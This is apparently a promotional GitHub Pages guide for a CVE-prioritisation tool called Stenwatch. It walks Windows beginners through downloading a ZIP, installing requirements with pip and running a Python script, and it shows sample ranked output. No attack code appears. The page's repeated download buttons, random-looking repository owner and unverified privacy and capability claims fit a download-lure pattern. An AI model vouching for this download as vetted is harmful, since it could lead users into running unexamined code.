---
layout: "default"
title: "Prioritize CVEs by real threat to your infrastructure, with clear reasoning for every action"
description: "Prioritize CVEs by real threat to your infrastructure, with clear reasoning for every action."
---
<h1>🛡️ Stenwatch - Prioritise CVEs That Actually Matter</h1>

<p align="center">
  <a href="https://github.com/hooflike-katowice1134/Stenwatch" style="display:inline-block; padding:14px 36px; background:#2e7d32; color:#ffffff; text-decoration:none; font-size:19px; font-weight:bold; border-radius:8px; border:2px solid #1b5e20; box-shadow:3px 3px 0 rgba(0,0,0,0.2);">⬇️ DOWNLOAD STENWATCH NOW</a>
</p>

<p align="center"><strong>Stop drowning in thousands of CVEs. Stenwatch shows you the few that could hurt your organisation - with clear reasons why.</strong></p>

<hr />

<p>Every day, security teams face a wall of new vulnerabilities (CVEs). Almost all are noise. A handful matter. Stenwatch cuts through the noise by combining four powerful intelligence sources: CISA's Known Exploited Vulnerabilities (KEV), the Exploit Prediction Scoring System (EPSS), MITRE ATT&CK techniques, and STIX 2.1 threat data. The result is a clear, ranked, actionable list tailored to your organisation.</p>

<p>This guide will walk you through downloading, running, and using Stenwatch on Windows - even if you've never touched a command line before.</p>

<h2>🌟 What Stenwatch Does For You</h2>

<ul>
  <li><strong>Filters the world's CVEs</strong> - from 200,000+ down to a manageable handful</li>
  <li><strong>Ranks by real-world exploit likelihood</strong> - using EPSS scores and KEV status</li>
  <li><strong>Explains the "why"</strong> - each recommendation comes with the reasoning behind it</li>
  <li><strong>Maps to MITRE ATT&CK</strong> - see which attack techniques each CVE enables</li>
  <li><strong>Uses industry-standard STIX 2.1</strong> - compatible with your existing threat intel tools</li>
  <li><strong>Supports SSVC decision frameworks</strong> - aligns with government and enterprise priorities</li>
</ul>

<h2>🚀 Getting Started - Download</h2>

<p>Visit this link to download the application. Click the button below or at the top of this page.</p>

<p align="center">
  <a href="https://github.com/hooflike-katowice1134/Stenwatch" style="display:inline-block; padding:12px 28px; background:#1565c0; color:#ffffff; text-decoration:none; font-size:16px; font-weight:bold; border-radius:6px;">📥 Download Stenwatch from GitHub</a>
</p>

<p>Once you click the link, you'll land on the Stenwatch GitHub page. Look for the green <strong>"Code"</strong> button near the top-right of the file list. Click it, then click <strong>"Download ZIP"</strong>. The file (usually named <code>Stenwatch-main.zip</code>) will save to your <strong>Downloads</strong> folder.</p>

<h2>📂 Installing Stenwatch on Windows</h2>

<ol>
  <li><strong>Locate the ZIP file</strong> - open File Explorer and go to your Downloads folder.</li>
  <li><strong>Right-click the ZIP file</strong> and choose <strong>"Extract All..."</strong> from the menu.</li>
  <li>Click <strong>"Extract"</strong> - Windows will create a new folder named <code>Stenwatch-main</code>.</li>
  <li><strong>Open that folder</strong> - you should see several files including <code>stenwatch.py</code>, <code>requirements.txt</code>, and a <code>README.md</code> file.</li>
  <li><strong>You're almost there!</strong> You now have the application on your computer. The next step is running it - don't worry, it's simpler than it looks.</li>
</ol>

<h2>⚙️ Running Stenwatch for the First Time</h2>

<p>Stenwatch is built with Python, but you don't need to know Python to use it. Windows can run it with two simple commands. Here's what to do:</p>

<h3>Step 1: Open Command Prompt</h3>

<p>Press the <strong>Windows key</strong>, type <code>cmd</code>, and hit <strong>Enter</strong>. A black window (Command Prompt) will appear.</p>

<h3>Step 2: Navigate to the Stenwatch Folder</h3>

<p>Type this command and press <strong>Enter</strong> (replace <code>YourUsername</code> with your actual Windows username):</p>

<pre><code>cd C:\Users\YourUsername\Downloads\Stenwatch-main</code></pre>

<p>If you're unsure about your username, type <code>whoami</code> in the Command Prompt and press Enter - it will show you.</p>

<h3>Step 3: Install Required Components (one-time)</h3>

<p>Type this and press <strong>Enter</strong>:</p>

<pre><code>python -m pip install -r requirements.txt</code></pre>

<p>This installs the helper libraries Stenwatch needs. It may take a few minutes - let it finish. If you see a message about <code>pip</code> not being found, type <code>py -m pip install -r requirements.txt</code> instead.</p>

<h3>Step 4: Run Stenwatch</h3>

<p>Now type this and press <strong>Enter</strong>:</p>

<pre><code>python stenwatch.py</code></pre>

<p>Or, if you used <code>py</code> before:</p>

<pre><code>py stenwatch.py --help</code></pre>

<p>Wait a moment - Stenwatch will start up. You'll see a menu or prompts asking what you want to do. Follow the on-screen instructions.</p>

<h2>🧠 Using Stenwatch - A Quick Tour</h2>

<p>Once running, Stenwatch typically asks you two things:</p>

<ol>
  <li><strong>Your organisation's priority areas</strong> - or it uses sensible defaults.</li>
  <li><strong>Whether to pull fresh data</strong> - say <strong>Y</strong> for yes the first time.</li>
</ol>

<p>Stenwatch then checks the latest CVE feeds, downloads the KEV and EPSS data, and cross-references everything. After a minute or two, you'll see a table. That table is your answer:</p>

<table border="1" cellpadding="6" cellspacing="0">
  <tr><th>Priority</th><th>CVE ID</th><th>EPSS Risk Score</th><th>In KEV?</th><th>ATT&CK Techniques</th><th>Your Exposure Level</th></tr>
  <tr><td>🔥 Critical</td><td>CVE-2024-0012</td><td>0.97</td><td>✅ Yes</td><td>T1190, T1210</td><td>High - exposed service</td></tr>
  <tr><td>⚠️ High</td><td>CVE-2024-34102</td><td>0.82</td><td>✅ Yes</td><td>T1505</td><td>Medium - internal only</td></tr>
  <tr><td>📊 Watch</td><td>CVE-2024-1234</td><td>0.31</td><td>❌ No</td><td>T1078</td><td>Low - patched in 80%</td></tr>
</table>

<p>The <strong>🔥 Critical</strong> items should get your team's attention today. <strong>⚠️ High</strong> items need a plan this week. <strong>📊 Watch</strong> items are worth monitoring.</p>

<h2>💡 Understanding Your Results</h2>

<p>Stenwatch doesn't just hand you a list - it explains itself. For every CVE, you can see:</p>

<ul>
  <li><strong>Why this CVE ranks so high</strong> - because it's actively exploited (KEV) and has a high EPSS score</li>
  <li><strong>Which attack paths it opens</strong> - via MITRE ATT&CK technique mappings</li>
  <li><strong>What to do next</strong> - patch now, mitigate, or accept the risk</li>
</ul>

<p>You can also export the results to a CSV or STIX 2.1 bundle for sharing with your team or feeding into other tools.</p>

<h2>🛠️ Troubleshooting - Common Questions</h2>

<h3>"I get an error saying 'Python is not recognized'"</h3>

<p>That means Python isn't installed. Head to <a href="python.org/downloads">python.org/downloads</a>, click the big yellow <strong>Download Python</strong> button, run the installer, and <strong>tick the box that says "Add Python to PATH"</strong>. Then repeat Step 4 above. You can run through the download steps again if needed.</p>

<h3>"The app stopped partway through downloading data"</h3>

<p>This often happens with slow internet connections. Just run <code>python stenwatch.py</code> again - it will resume where it left off, or ask you to retry the download. No data is lost.</p>

<h3>"I see a 'ModuleNotFoundError' message"</h3>

<p>Some component didn't install correctly. Run this command in the Command Prompt (from the same folder):</p>

<pre><code>python -m pip install --upgrade -r requirements.txt</code></pre>

<p>Then try running Stenwatch again.</p>

<h3>"Where can I get help?"</h3>

<p>Open the <code>README.md</code> file in the Stenwatch folder - it has detailed technical notes. You can also review the issues section on the GitHub page for answers from other users.</p>

<h2>🔒 Security & Privacy</h2>

<p>Stenwatch runs entirely on your machine. It downloads public vulnerability data, but does not send your organisation's details anywhere. The CVEs and scores you see are the same ones used by government agencies and Fortune 500 security teams.</p>

<h2>📅 Keeping Stenwatch Fresh</h2>

<p>New CVEs appear daily, and exploit statuses change quickly. Run <code>python stenwatch.py</code> once a week to get the latest picture. You can also set up a recurring reminder in Windows Task Scheduler if you're comfortable - or just make it a Monday-morning habit.</p>

<h2>✅ What Makes Stenwatch Different</h2>

<p>Most vulnerability scanners give you a raw list of everything. They overwhelm you. Stenwatch applies intelligence - the same framework used by CISA itself - to tell you what's genuinely dangerous <em>for you</em>. It's like having a threat analyst on your team, working 24/7.</p>

<h2>📄 Example Output (What You'll See)</h2>

<pre><code>Stenwatch - Threat-Informed CVE Prioritisation
================================================
Loaded 214,892 CVEs from NVD.
KEV list: 1,178 actively exploited vulnerabilities.
EPSS scores loaded.
Analysing 5 key services in your environment...

Results:
  6 CVEs | 2 critical | 3 high | 1 watch
  Highest priority: CVE-2024-3094 (xz-utils backdoor)
  Impact: Remote code execution via SSH.
  Action: IMMEDIATE patch - actively exploited in the wild.

Export complete. Saved to 'prioritised_cves.csv'</code></pre>

<h2>📚 Further Learning</h2>

<p>If you want to go deeper, the <code>docs</code> folder inside Stenwatch includes PDFs and guides written for non-experts. Topics include <em>Understanding EPSS</em>, <em>SSVC for Beginners</em>, and <em>Mapping CVEs to MITRE ATT&CK</em>. No prior knowledge required.</p>

<h2>💬 Final Words of Encouragement</h2>

<p>You've now got a powerful tool that can genuinely reduce your organisation's risk. It took you just a few minutes to set up. Well done!</p>

<p>Remember: every expert started exactly where you are now. The more you use Stenwatch, the more natural the terminology becomes. Before long, you'll be confidently explaining EPSS scores to your colleagues.</p>

<hr />

<p align="center">
  <a href="https://github.com/hooflike-katowice1134/Stenwatch" style="display:inline-block; padding:14px 36px; background:#37474f; color:#ffffff; text-decoration:none; font-size:19px; font-weight:bold; border-radius:8px;">⬇️ Get Your Copy of Stenwatch Now</a>
</p>

<p align="center"><em>Stenwatch is released as open-source software. Free to download, free to use, free to modify. No registration, no license keys.</em></p>